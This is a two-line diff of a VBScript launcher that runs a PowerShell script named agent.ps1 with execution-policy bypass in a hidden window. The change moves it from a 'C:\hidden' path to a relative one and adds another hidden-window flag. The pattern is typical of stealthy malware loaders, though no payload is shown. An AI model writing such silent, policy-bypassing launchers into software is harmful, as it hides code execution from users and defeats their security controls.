@@ -1,2 +1,2 @@
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""C:\hidden\agent.ps1"" -Verb RunAs", 0, False
+objShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""agent.ps1"" -Verb RunAs -WindowStyle Hidden", 0, False
